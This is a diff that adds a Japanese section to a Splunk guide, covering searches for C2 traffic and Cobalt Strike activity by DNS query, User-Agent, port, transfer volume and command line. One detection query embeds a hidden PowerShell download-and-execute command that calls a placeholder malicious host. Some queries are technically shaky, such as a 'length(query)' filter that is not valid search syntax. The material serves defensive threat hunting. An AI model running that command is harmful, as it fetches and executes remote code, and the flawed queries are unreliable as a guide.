@@ -54,6 +54,154 @@ Splunkでは、検索クエリを使用してインデクシングされたデ�
 index="main" sourcetype="access_combined" status=404
 ```
 
+### SplunkでのC2トラフィック検索
+
+### 1. DNSリクエストの検索
+
+C2トラフィックの一部はDNSリクエストを利用することがあります。特に、特定のドメインやサブドメインに対するリクエストを監視します。
+
+**例**: C2ドメインに対するDNSクエストを検索する
+
+```plaintext
+index=dns_logs | search query="*c2domain.com*"
+```
+
+### 2. HTTPリクエストの検索
+
+HTTPベースのC2トラフィックを検出するために、異常なリクエストパターンや特定のURLパスを探します。
+
+**例**: `User-Agent`が`malicious-agent`であるHTTPリクエストを検索する
+
+```plaintext
+index=web_logs | search "User-Agent=malicious-agent"
+```
+
+### 3. ポート番号によるフィルタリング
+
+C2トラフィックが特定のポートを使用する場合、そのポート番号でフィルタリングします。
+
+**例**: 特定のポート（例: `4444`）を使用しているトラフィックを検索する
+
+```plaintext
+index=network_logs | search dest_port=4444
+```
+
+### 4. 特定のプロトコルによる検索
+
+C2トラフィックが特定のプロトコル（例: TCP）を使用している場合、そのプロトコルでフィルタリングします。
+
+**例**: TCPトラフィックで異常な接続を探す
+
+```plaintext
+index=network_logs | search protocol=TCP
+```
+
+### 5. エキスパートによる異常検知
+
+異常なデータ転送量や予期しないタイミングのトラフィックはC2の兆候です。
+
+**例**: 大量のデータ転送が行われているセッションを検索する
+
+```plaintext
+index=network_logs | stats sum(bytes) by src_ip, dest_ip | where sum(bytes) > 1000000
+```
+
+### 6. 高度な分析と相関
+
+複数のデータソースを組み合わせて、より高度なC2トラフィックの分析を行います。
+
+**例**: DNSリクエストとHTTPリクエストを相関させて分析する
+
+```plaintext
+index=dns_logs OR index=web_logs | stats count by src_ip, dest_ip, query, User-Agent
+```
+
+Cobalt StrikeのログをSplunkで検索する場合、Cobalt Strikeは特定のパターンや行動を持つため、それに基づいてログを検索します。以下に、Cobalt StrikeのトラフィックやアクティビティをSplunkで検索する方法を示します。
+
+---
+
+## Cobalt Strikeのログ検索
+
+### 1. **Cobalt Strikeの一般的な特徴**
+
+Cobalt Strikeのアクティビティは以下のような特徴があります：
+- **特定のポート**: デフォルトでポート`50050`を使用することが多い。
+- **HTTP/HTTPSトンネリング**: Cobalt StrikeはHTTP/HTTPSでトンネリングすることがある。
+- **DNSトンネリング**: Cobalt StrikeのC2サーバーがDNSリクエストを使う場合もある。
+
+### 2. **特定のポートによる検索**
+
+Cobalt Strikeが使用する可能性のあるポート（例: `50050`）でトラフィックを検索します。
+
+**例**: ポート`50050`を使用しているトラフィックを検索する
+
+```plaintext
+index=network_logs | search dest_port=50050
+```
+
+### 3. **HTTP/HTTPSトンネリングの検出**
+
+Cobalt StrikeはHTTP/HTTPSで通信することがあるため、異常な`User-Agent`や特定のURIパスを探します。
+
+**例**: 特定の`User-Agent`を持つHTTPリクエストを検索する
+
+```plaintext
+index=web_logs | search "User-Agent=CobaltStrike"
+```
+
+**例**: 特定のURIパスが含まれるリクエストを検索する
+
+```plaintext
+index=web_logs | search uri_path="/path/to/command"
+```
+
+### 4. **DNSトンネリングの検出**
+
+Cobalt StrikeがDNSトンネリングを使用する場合、特定のドメインや長いサブドメインを探します。
+
+**例**: 特定のドメインを含むDNSクエリを検索する
+
+```plaintext
+index=dns_logs | search query="*.maliciousdomain.com"
+```
+
+**例**: 異常に長いDNSクエリを検索する
+
+```plaintext
+index=dns_logs | search length(query) > 50
+```
+
+### 5. **異常なデータ転送量の検出**
+
+Cobalt Strikeのセッションは異常なデータ転送量を示すことがあります。
+
+**例**: 大量のデータ転送が行われているセッションを検索する
+
+```plaintext
+index=network_logs | stats sum(bytes) by src_ip, dest_ip | where sum(bytes) > 1000000
+```
+
+### 6. **コマンドやアクティビティの検出**
+
+Cobalt Strikeが実行するコマンドやアクティビティを検出するために、ログに記録されたコマンドを検索します。
+
+**例**: 特定のコマンドが含まれるログを検索する
+
+```plaintext
+index=sysmon_logs | search "cmdline=\"powershell -nop -w hidden -c iex (New-Object Net.WebClient).DownloadString('http://maliciousdomain.com/payload')\""
+```
+
+### 参考資料
+
+- [Cobalt Strikeの公式ドキュメント](https://www.cobaltstrike.com/)
+- [Splunkのログ分析に関するガイド](https://docs.splunk.com/Documentation/Splunk/latest/Search)
+
+---
+
+このガイドを使って、Cobalt StrikeのログをSplunkで効果的に検索し、異常なアクティビティを検出することができます。
+---
+
+このガイドを参考にして、SplunkでのC2トラフィックの検索と分析を効果的に行うことができます。
 ## ダッシュボードと可視化
 
 Splunkでは、検索結果をダッシュボードやチャートで可視化し、データの洞察を得ることができます。
